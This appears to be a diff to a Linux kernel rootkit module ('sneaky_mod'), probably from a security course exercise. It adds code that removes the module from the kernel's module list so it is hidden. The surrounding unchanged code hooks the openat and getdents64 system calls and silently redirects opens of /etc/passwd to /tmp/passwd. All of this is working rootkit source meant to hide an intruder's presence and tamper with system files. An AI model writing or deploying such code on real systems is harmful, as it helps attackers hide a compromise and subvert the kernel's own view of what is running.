@@ -2,6 +2,7 @@
 #include <linux/moduleparam.h>
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
+#include <linux/list.h>        // the list macros for hiding the module
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
@@ -14,6 +15,9 @@
 #define PREFIX "sneaky_process"
 #define PASSWORDFILE "/etc/passwd"
 #define TEMPPASSWORDFILE "/tmp/passwd"
+#define PATH_LENGTH 100
+
+static struct list_head *prev_module;
 
 // process id argument
 static int pid;
@@ -45,9 +49,9 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   char *pathname = (char *)regs->si;
-  char kpathname[100] = {0};
+  char kpathname[PATH_LENGTH] = {0};
   char *temppathname = TEMPPASSWORDFILE;
-  strncpy_from_user(kpathname, pathname, 100);
+  strncpy_from_user(kpathname, pathname, PATH_LENGTH);
   if(strcmp(kpathname, PASSWORDFILE) == 0) {
     copy_to_user(pathname, temppathname, sizeof(temppathname));
   }
@@ -106,7 +110,11 @@ static int initialize_sneaky_module(void)
   // You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
-  
+
+  // Hide sneaky_mod
+  prev_module = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -116,7 +124,10 @@ static int initialize_sneaky_module(void)
 
 static void exit_sneaky_module(void) 
 {
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
+
+  // Unhide sneaky_mod
+  list_add(&THIS_MODULE->list, prev_module);
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
